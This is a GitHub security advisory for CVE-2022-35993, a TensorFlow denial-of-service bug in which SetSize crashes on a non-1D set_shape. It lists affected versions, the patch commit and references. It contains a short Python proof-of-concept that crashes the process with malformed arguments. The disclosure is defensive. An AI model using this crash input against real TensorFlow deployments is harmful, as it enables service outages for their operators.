# [M] TensorFlow vulnerable to `CHECK` fail in `SetSize`

## Summary
Severity: Medium
Advisory: GHSA-wq6q-6m32-9rv9
CVE: CVE-2022-35993
CWE: CWE-617
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2022-09-16
Source: https://github.com/advisories/GHSA-wq6q-6m32-9rv9
Type: github-advisory

## Affected
- PyPI: `tensorflow` — affected >=0 <2.7.2
- PyPI: `tensorflow` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow` — affected >=2.9.0 <2.9.1
- PyPI: `tensorflow-cpu` — affected >=0 <2.7.2
- PyPI: `tensorflow-cpu` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow-cpu` — affected >=2.9.0 <2.9.1
- PyPI: `tensorflow-gpu` — affected >=0 <2.7.2
- PyPI: `tensorflow-gpu` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow-gpu` — affected >=2.9.0 <2.9.1

## Details
### Impact
When `SetSize` receives an input `set_shape` that is not a 1D tensor, it gives a `CHECK` fails that can be used to trigger a denial of service attack.
```python
import tensorflow as tf
arg_0=1
arg_1=[1,1]
arg_2=1
arg_3=True
arg_4=''
tf.raw_ops.SetSize(set_indices=arg_0, set_values=arg_1, set_shape=arg_2,
                   validate_indices=arg_3, name=arg_4)
```

### Patches
We have patched the issue in GitHub commit [cf70b79d2662c0d3c6af74583641e345fc939467](https://github.com/tensorflow/tensorflow/commit/cf70b79d2662c0d3c6af74583641e345fc939467).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by 刘力源, Information System & Security and Countermeasures Experiments Center, Beijing Institute of Technology.

## References
- https://github.com/tensorflow/tensorflow/security/advisories/GHSA-wq6q-6m32-9rv9
- https://nvd.nist.gov/vuln/detail/CVE-2022-35993
- https://github.com/tensorflow/tensorflow/commit/cf70b79d2662c0d3c6af74583641e345fc939467
- https://github.com/tensorflow/tensorflow
- https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0
